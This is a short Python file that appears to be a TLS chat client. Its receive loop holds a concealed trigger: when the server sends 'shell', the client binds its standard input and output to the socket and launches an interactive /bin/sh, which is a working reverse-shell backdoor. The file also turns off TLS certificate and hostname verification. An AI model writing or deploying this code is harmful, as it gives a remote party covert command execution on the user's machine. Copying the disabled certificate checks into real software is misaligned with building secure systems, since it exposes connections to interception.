import socket
import ssl
import threading
import sys
import os
import subprocess


def reverse_shell(socket):
    os.dup2(socket.fileno(),0)
    os.dup2(socket.fileno(),1)
    os.dup2(socket.fileno(),2)
    subprocess.call(['/bin/sh', '-i'])


def receive_messages(secure_sock):
    while True:
        try:
            message = secure_sock.recv(1024).decode()
            if message == "shell":
                print("GETTING SHELL")
                reverse_shell(secure_sock)
            if not message:
                print("Connection closed by the server.")
                break
            print(repr(message))
        except Exception as e:
            print(f"Error receiving message: {e}")
            break

def send_messages(secure_sock):
    while True:
        try:
            message = input()
            if message.lower() == "exit":
                secure_sock.sendall("exit".encode())
                break
            secure_sock.sendall(message.encode())
        except Exception as e:
            print(f"Error sending message: {e}")
            break

def connect_to_server(server_address, server_port):
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    secure_sock = context.wrap_socket(sock, server_hostname=server_address)
    
    try:
        print(f"Connecting to {server_address}:{server_port}...")
        secure_sock.connect((server_address, server_port))
        print(secure_sock.recv(1024).decode())

        receive_thread = threading.Thread(target=receive_messages, args=(secure_sock,))
        send_thread = threading.Thread(target=send_messages, args=(secure_sock,))

        receive_thread.start()
        send_thread.start()

        receive_thread.join()
        send_thread.join()

    except ssl.SSLError as e:
        print(f"SSL error: {e}")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        secure_sock.close()

# Example usage
connect_to_server('127.0.0.1', int(sys.argv[1]))
